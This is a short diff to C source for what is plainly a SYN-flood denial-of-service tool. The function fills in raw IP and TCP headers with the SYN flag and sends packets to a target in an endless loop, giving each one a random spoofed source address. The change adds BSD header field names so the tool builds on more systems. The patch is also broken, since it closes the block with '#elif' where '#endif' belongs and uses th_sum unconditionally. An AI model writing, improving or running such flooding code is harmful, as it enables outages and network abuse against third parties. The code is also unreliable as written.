@@ -80,18 +80,26 @@ void access(int sock,struct sockaddr_in *target,unsigned short srcport){
    ip->ip_p=IPPROTO_TCP;
    ip->ip_sum=0;
    ip->ip_dst=target->sin_addr;
-
    tcp = (struct tcphdr*)(buf+sizeof(struct ip));
+#ifdef __linux
    tcp->source = htons(srcport);
    tcp->dest = target->sin_port;
    tcp->seq = random();
    tcp->doff = 5;
    tcp->syn = 1;
    tcp->check = 0;
+#else
+   tcp->th_sport = htons(srcport);
+   tcp->th_dport = target->sin_port;
+   tcp->th_seq = random();
+   tcp->th_off = 5;
+   tcp->th_flags =0x02;
+   tcp->th_sum = 0;
+#elif
 
    while(1){
            ip->ip_src.s_addr = random();
-           tcp->check=check_sum((unsigned short*)tcp,sizeof(struct tcphdr));
+           tcp->th_sum = check_sum((unsigned short*)tcp,sizeof(struct tcphdr));
            sendto(sock,buf,ip_len,0,(struct sockaddr*)target,sizeof(struct sockaddr_in));
    }
 }
